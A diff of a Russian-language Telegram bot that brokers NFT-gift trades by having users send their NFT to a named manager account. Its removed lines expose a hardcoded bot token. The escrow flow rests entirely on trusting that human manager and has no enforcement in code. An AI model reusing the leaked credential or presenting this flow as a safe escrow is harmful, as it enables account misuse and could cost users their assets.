@@ -1,7 +1,23 @@
 import logging
 import uuid
-import json
+import os
 from datetime import datetime
+from dotenv import load_dotenv
+
+# Загружаем .env
+load_dotenv()
+
+# Настройки из .env
+API_TOKEN = os.getenv('BOT_TOKEN')
+ADMIN_ID = int(os.getenv('ADMIN_ID', '174415647'))
+SUPPORT_USERNAME = os.getenv('SUPPORT_USERNAME', 'GiftExchangersSupport')
+MANAGER_USERNAME = os.getenv('MANAGER_USERNAME', 'GiftExchangersManager')
+BOT_USERNAME = os.getenv('BOT_USERNAME', 'GiftExchangersBot')
+
+# Проверка токена
+if not API_TOKEN:
+    raise ValueError("Нет токена! Проверь файл .env")
+
 from aiogram import Bot, Dispatcher, types
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from aiogram.utils import executor
@@ -9,13 +25,6 @@ from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMar
 from aiogram.dispatcher import FSMContext
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
-
-# Токен и админ ID
-API_TOKEN = '8487741416:AAHlISX26SKheAnTQJCv1rPHY-X0f3fWdI0'
-ADMIN_ID = 174415647
-SUPPORT_USERNAME = "GiftExchangersSupport"
-MANAGER_USERNAME = "GiftExchangersManager"
-BOT_USERNAME = "GiftExchangersBot"
 
 # Инициализация
 bot = Bot(token=API_TOKEN)
@@ -25,25 +34,31 @@ dp.middleware.setup(LoggingMiddleware())
 logging.basicConfig(level=logging.INFO)
 
 # Хранилища данных
-deals = {}  # {deal_id: {'creator_id': int, 'participant_id': int, 'status': str, 'amount': float, 'nft_name': str, 'created_at': str}}
-top_deals = []  # Список топ-15 сделок
+deals = {}
+top_deals = []
 
-# Состояния для создания сделки
+# Состояния
 class DealStates(StatesGroup):
     waiting_for_nft_name = State()
     waiting_for_amount = State()
-    waiting_for_confirmation = State()
 
-# Состояния для админ-панели
 class AdminStates(StatesGroup):
     waiting_for_broadcast = State()
 
 # Клавиатуры
 def main_keyboard():
-    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
-    keyboard.add(KeyboardButton("📝 Создать сделку"))
-    keyboard.add(KeyboardButton("ℹ️ Информация"), KeyboardButton("❓ Как проходит сделка"))
-    keyboard.add(KeyboardButton("🏆 Топ-15 обменов"), KeyboardButton("📞 Техподдержка"))
+    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    keyboard.add(
+        KeyboardButton("📝 Создать сделку"),
+        KeyboardButton("ℹ️ Информация")
+    )
+    keyboard.add(
+        KeyboardButton("❓ Как проходит сделка"),
+        KeyboardButton("📞 Техподдержка")
+    )
+    keyboard.add(
+        KeyboardButton("🏆 Топ-15 обменов")
+    )
     return keyboard
 
 def info_keyboard():
@@ -51,14 +66,6 @@ def info_keyboard():
     keyboard.add(
         InlineKeyboardButton("❓ Как происходит сделка?", callback_data="how_deal"),
         InlineKeyboardButton("🏠 В главное меню", callback_data="main_menu")
-    )
-    return keyboard
-
-def deal_creation_keyboard(deal_id):
-    keyboard = InlineKeyboardMarkup(row_width=1)
-    keyboard.add(
-        InlineKeyboardButton("✅ Принять сделку", callback_data=f"accept_deal_{deal_id}"),
-        InlineKeyboardButton("❌ Отменить сделку", callback_data=f"cancel_deal_{deal_id}")
     )
     return keyboard
 
@@ -106,19 +113,21 @@ async def info_command(message: types.Message):
 @dp.message_handler(lambda message: message.text == "❓ Как проходит сделка")
 async def how_deal_command(message: types.Message):
     deal_text = """
-❓Как проходит сделка в Off Trade?
+❓ Как проходит сделка в Off Trade?
 
 • Продавец и покупатель обговаривают условия сделки 🤝
 
-• Один участник сделки создаёт сделку через чек/в меню бота сделку - @GiftExchangersBot 🎁
+• Один участник сделки создаёт сделку через меню бота 🎁
 
-• Второй участник сделки принимает сделку 📤
+• Второй участник сделки принимает сделку по чеку 📤
 
-• после того как 2 человек присоединился к сделке то 1 человек должен передать NFT менеджеру - @GiftExchangersManager 💰
+• После того как 2 человека присоединились к сделке, первый участник передаёт NFT менеджеру - @GiftExchangersManager 💰
 
-• После передачи подарка, тех поддержка моментально одобрит приход NFT на аккаунт и затем следующая сторона передаёт NFT человеку и потом Менеджер автоматически передаст вам NFT
+• После передачи подарка, техподдержка одобряет получение NFT
 
-• После этого первая сторона сделки пишет любое сообщение технической поддержке - @OffTradeSupport, после чего моментально получает подарок. 
+• Вторая сторона передаёт NFT покупателю
+
+• Менеджер передаёт NFT первому участнику
 
 • Сделка завершена успешно! ✅
     """
@@ -138,7 +147,7 @@ async def support_command(message: types.Message):
 
 Напишите им в личные сообщения для получения помощи!
     """
-    await message.answer(support_text)
+    await message.answer(support_text, reply_markup=main_keyboard())
 
 @dp.message_handler(lambda message: message.text == "🏆 Топ-15 обменов")
 async def top_deals_command(message: types.Message):
@@ -201,10 +210,16 @@ async def process_amount(message: types.Message, state: FSMContext):
         """
         
         keyboard = InlineKeyboardMarkup().add(
-            InlineKeyboardButton("✅ Я отправил NFT менеджеру", callback_data=f"sent_to_manager_{deal_id}")
+            InlineKeyboardButton("✅ Принять сделку", callback_data=f"accept_deal_{deal_id}"),
+            InlineKeyboardButton("❌ Отменить", callback_data=f"cancel_deal_{deal_id}")
         )
         
-        await message.answer(deal_text, parse_mode="Markdown", reply_markup=keyboard)
+        # Отправляем создателю
+        await message.answer(deal_text, parse_mode="Markdown")
+        
+        # Отправляем сообщение с кнопками для принятия
+        await message.answer("🔗 Ссылка для второго участника:", reply_markup=keyboard)
+        
         await state.finish()
         
     except ValueError:
@@ -215,17 +230,17 @@ async def accept_deal(callback_query: types.CallbackQuery):
     deal_id = callback_query.data.replace('accept_deal_', '')
     
     if deal_id not in deals:
-        await callback_query.answer("Сделка не найдена!")
+        await callback_query.answer("❌ Сделка не найдена!")
         return
     
     deal = deals[deal_id]
     
     if deal['status'] != 'waiting':
-        await callback_query.answer("Эта сделка уже недоступна!")
+        await callback_query.answer("❌ Эта сделка уже недоступна!")
         return
     
     if callback_query.from_user.id == deal['creator_id']:
-        await callback_query.answer("Вы не можете принять свою сделку!")
+        await callback_query.answer("❌ Вы не можете принять свою сделку!")
         return
     
     deal['participant_id'] = callback_query.from_user.id
@@ -236,93 +251,34 @@ async def accept_deal(callback_query: types.CallbackQuery):
     # Уведомление создателю
     await bot.send_message(
         deal['creator_id'],
-        f"✅ {callback_query.from_user.full_name} принял вашу сделку!\n\n"
-        f"Теперь передайте NFT @{MANAGER_USERNAME}"
+        f"✅ @{callback_query.from_user.username} принял вашу сделку #{deal_id}!\n\n"
+        f"Теперь передайте NFT менеджеру @{MANAGER_USERNAME}"
     )
     
     await callback_query.message.edit_text(
         f"✅ Вы приняли сделку #{deal_id}\n\n"
         f"Ожидайте, когда создатель передаст NFT менеджеру."
     )
+    
+    await callback_query.answer()
 
-@dp.callback_query_handler(lambda c: c.data.startswith('sent_to_manager_'))
-async def sent_to_manager(callback_query: types.CallbackQuery):
-    deal_id = callback_query.data.replace('sent_to_manager_', '')
+@dp.callback_query_handler(lambda c: c.data.startswith('cancel_deal_'))
+async def cancel_deal(callback_query: types.CallbackQuery):
+    deal_id = callback_query.data.replace('cancel_deal_', '')
     
     if deal_id not in deals:
-        await callback_query.answer("Сделка не найдена!")
+        await callback_query.answer("❌ Сделка не найдена!")
         return
     
     deal = deals[deal_id]
     
-    # Отправка уведомления админу
-    admin_text = f"""
-📢 ТРЕБУЕТСЯ ПОДТВЕРЖДЕНИЕ!
-
-Сделка #{deal_id}
-Создатель: @{deal['creator_username']}
-NFT: {deal['nft_name']}
-Сумма: ${deal['amount']}
-
-Пользователь сообщил о передаче NFT менеджеру.
-Требуется подтверждение!
-    """
-    
-    admin_keyboard = InlineKeyboardMarkup(row_width=2).add(
-        InlineKeyboardButton("✅ Подтвердить", callback_data=f"confirm_manager_{deal_id}"),
-        InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_manager_{deal_id}")
-    )
-    
-    await bot.send_message(ADMIN_ID, admin_text, reply_markup=admin_keyboard)
-    
-    await callback_query.answer("Уведомление отправлено менеджеру!")
-    await callback_query.message.edit_text(
-        f"✅ Уведомление отправлено! Ожидайте подтверждения от менеджера."
-    )
-
-@dp.callback_query_handler(lambda c: c.data.startswith('confirm_manager_'))
-async def confirm_manager(callback_query: types.CallbackQuery):
-    if callback_query.from_user.id != ADMIN_ID:
-        await callback_query.answer("У вас нет прав!")
+    if callback_query.from_user.id != deal['creator_id']:
+        await callback_query.answer("❌ Вы не можете отменить эту сделку!")
         return
     
-    deal_id = callback_query.data.replace('confirm_manager_', '')
-    
-    if deal_id not in deals:
-        await callback_query.answer("Сделка не найдена!")
-        return
-    
-    deal = deals[deal_id]
-    
-    # Добавление в топ-15
-    top_deals.append({
-        'nft_name': deal['nft_name'],
-        'amount': deal['amount'],
-        'date': datetime.now().strftime("%Y-%m-%d")
-    })
-    
-    # Сохраняем только 15 лучших
-    global top_deals
-    top_deals = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
-    
-    # Уведомление участникам
-    await bot.send_message(
-        deal['creator_id'],
-        f"✅ Менеджер подтвердил получение NFT!\n\n"
-        f"Теперь напишите @{SUPPORT_USERNAME} для завершения сделки."
-    )
-    
-    await bot.send_message(
-        deal['participant_id'],
-        f"✅ Менеджер подтвердил получение NFT от продавца!\n\n"
-        f"Ожидайте, когда продавец свяжется с поддержкой."
-    )
-    
-    deal['status'] = 'completed'
-    
-    await callback_query.message.edit_text(
-        f"✅ Подтверждено! Сделка #{deal_id} завершена и добавлена в топ-15."
-    )
+    deals[deal_id]['status'] = 'cancelled'
+    await callback_query.message.edit_text(f"❌ Сделка #{deal_id} отменена.")
+    await callback_query.answer()
 
 @dp.callback_query_handler(lambda c: c.data == "how_deal")
 async def how_deal_callback(callback_query: types.CallbackQuery):
@@ -339,7 +295,7 @@ async def main_menu_callback(callback_query: types.CallbackQuery):
 @dp.message_handler(commands=['admin'])
 async def admin_panel(message: types.Message):
     if message.from_user.id != ADMIN_ID:
-        await message.answer("У вас нет доступа к админ-панели!")
+        await message.answer("❌ У вас нет доступа к админ-панели!")
         return
     
     await message.answer("👨‍💼 Панель администратора:", reply_markup=admin_keyboard())
@@ -347,7 +303,7 @@ async def admin_panel(message: types.Message):
 @dp.callback_query_handler(lambda c: c.data == "admin_stats")
 async def admin_stats(callback_query: types.CallbackQuery):
     if callback_query.from_user.id != ADMIN_ID:
-        await callback_query.answer("Нет доступа!")
+        await callback_query.answer("❌ Нет доступа!")
         return
     
     total_deals = len(deals)
@@ -361,12 +317,7 @@ async def admin_stats(callback_query: types.CallbackQuery):
 ✅ Завершено: {completed_deals}
 🔄 Активных: {active_deals}
 🏆 В топ-15: {len(top_deals)}
-
-💰 Топ-3 обмена:
     """
-    
-    for i, deal in enumerate(sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:3], 1):
-        stats_text += f"\n{i}. {deal['nft_name']} — ${deal['amount']}"
     
     await callback_query.message.edit_text(stats_text, reply_markup=admin_keyboard())
     await callback_query.answer()
@@ -374,11 +325,11 @@ async def admin_stats(callback_query: types.CallbackQuery):
 @dp.callback_query_handler(lambda c: c.data == "admin_deals")
 async def admin_deals(callback_query: types.CallbackQuery):
     if callback_query.from_user.id != ADMIN_ID:
-        await callback_query.answer("Нет доступа!")
+        await callback_query.answer("❌ Нет доступа!")
         return
     
     if not deals:
-        await callback_query.message.edit_text("Нет активных сделок.", reply_markup=admin_keyboard())
+        await callback_query.message.edit_text("📭 Нет активных сделок.", reply_markup=admin_keyboard())
         return
     
     deals_text = "📋 АКТИВНЫЕ СДЕЛКИ:\n\n"
@@ -390,20 +341,13 @@ async def admin_deals(callback_query: types.CallbackQuery):
         deals_text += f"📊 Статус: {deal['status']}\n"
         deals_text += "—" * 20 + "\n"
     
-    # Разбиваем на части, если текст слишком длинный
-    if len(deals_text) > 4000:
-        parts = [deals_text[i:i+4000] for i in range(0, len(deals_text), 4000)]
-        for part in parts:
-            await callback_query.message.answer(part)
-    else:
-        await callback_query.message.edit_text(deals_text, reply_markup=admin_keyboard())
-    
+    await callback_query.message.edit_text(deals_text[:4000], reply_markup=admin_keyboard())
     await callback_query.answer()
 
 @dp.callback_query_handler(lambda c: c.data == "admin_broadcast")
 async def admin_broadcast(callback_query: types.CallbackQuery, state: FSMContext):
     if callback_query.from_user.id != ADMIN_ID:
-        await callback_query.answer("Нет доступа!")
+        await callback_query.answer("❌ Нет доступа!")
         return
     
     await callback_query.message.edit_text(
@@ -415,12 +359,11 @@ async def admin_broadcast(callback_query: types.CallbackQuery, state: FSMContext
 @dp.message_handler(state=AdminStates.waiting_for_broadcast)
 async def process_broadcast(message: types.Message, state: FSMContext):
     if message.from_user.id != ADMIN_ID:
-        await message.answer("Нет доступа!")
+        await message.answer("❌ Нет доступа!")
         return
     
     broadcast_text = message.text
     
-    # Собираем уникальных пользователей из сделок
     users = set()
     for deal in deals.values():
         users.add(deal['creator_id'])
@@ -448,31 +391,15 @@ async def process_broadcast(message: types.Message, state: FSMContext):
 @dp.callback_query_handler(lambda c: c.data == "admin_close")
 async def admin_close(callback_query: types.CallbackQuery):
     if callback_query.from_user.id != ADMIN_ID:
-        await callback_query.answer("Нет доступа!")
+        await callback_query.answer("❌ Нет доступа!")
         return
     
     await callback_query.message.delete()
     await callback_query.answer()
 
-@dp.callback_query_handler(lambda c: c.data.startswith('cancel_deal_'))
-async def cancel_deal(callback_query: types.CallbackQuery):
-    deal_id = callback_query.data.replace('cancel_deal_', '')
-    
-    if deal_id not in deals:
-        await callback_query.answer("Сделка не найдена!")
-        return
-    
-    deal = deals[deal_id]
-    
-    if callback_query.from_user.id != deal['creator_id']:
-        await callback_query.answer("Вы не можете отменить эту сделку!")
-        return
-    
-    deals[deal_id]['status'] = 'cancelled'
-    await callback_query.message.edit_text(f"❌ Сделка #{deal_id} отменена.")
-    await callback_query.answer()
-
-# Запуск бота
+# Запуск
 if __name__ == '__main__':
-    print("Бот запущен...")
+    print("🚀 Бот запущен...")
+    print(f"🤖 Токен: {API_TOKEN[:10]}...")
+    print(f"👑 Админ ID: {ADMIN_ID}")
     executor.start_polling(dp, skip_updates=True)
